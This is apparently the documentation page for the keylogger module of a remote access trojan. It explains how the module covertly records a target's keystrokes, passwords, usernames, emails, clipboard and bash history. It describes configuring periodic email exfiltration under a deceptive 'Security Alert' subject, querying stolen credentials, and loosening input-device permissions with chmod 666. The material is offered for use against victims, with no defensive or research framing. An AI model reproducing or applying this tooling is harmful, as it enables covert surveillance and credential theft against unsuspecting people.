# Keylogger Module

## Overview

The keylogger module captures keystrokes and extracts sensitive information from the target device.

## Features

- **Keystroke Capture** - Records all keyboard input
- **Password Detection** - Automatically detects and extracts passwords
- **Email Capture** - Captures email addresses from input
- **Username Detection** - Extracts usernames from login forms
- **Clipboard Monitoring** - Monitors clipboard for copied data
- **Terminal History** - Monitors bash history for commands

## Configuration

Edit `rat_agent/config.py`:

```python
# Keylogger Settings
KEYLOGGER_ENABLED = True
KEYLOGGER_SEND_INTERVAL = 600  # Send every 10 minutes
```

## How It Works

### Linux/Unix

1. Uses `evdev` library to capture keyboard events
2. Falls back to monitoring terminal input if evdev unavailable
3. Monitors `.bash_history` for command history
4. Monitors clipboard via `xclip`

### Windows

1. Uses Windows API hooks
2. Requires GUI access

## Captured Data

The keylogger captures and stores:

1. **Keystrokes** - All keyboard input
2. **Passwords** - Detected from patterns like:
   - `password: xxxxx`
   - `passwd=xxxxx`
   - Login forms

3. **Emails** - Email addresses from input

4. **Usernames** - Usernames from login forms

## Viewing Captured Data

### Via Dashboard

1. Access dashboard
2. Navigate to "Keylogger" section
3. View captured keystrokes and credentials

### Via Database

```python
from rat_agent.database import get_credentials

creds = get_credentials()
for cred in creds:
    print(f"{cred['username']}: {cred['password']}")
```

### Via Command Line

```bash
# View keylog file
cat /tmp/opencode/.keylog_cache.txt

# View credentials in database
sqlite3 rat_config.db "SELECT * FROM credentials;"
```

## Email Notifications

Captured credentials are automatically emailed with subject:
- **Subject:** "Security Alert - Action Required"

## Privacy Considerations

- Keylog data is stored locally first
- Sent to email at configured intervals
- Can be cleared via dashboard

## Troubleshooting

### Keylogger not capturing

1. Check if evdev is installed:
```bash
pip3 install evdev
```

2. Check permissions:
```bash
sudo chmod 666 /dev/input/event*
```

### No credentials detected

The keylogger looks for patterns like:
- `password: xxxxx`
- `user: xxxxx`
- Email addresses

Make sure the target is typing in recognizable formats.
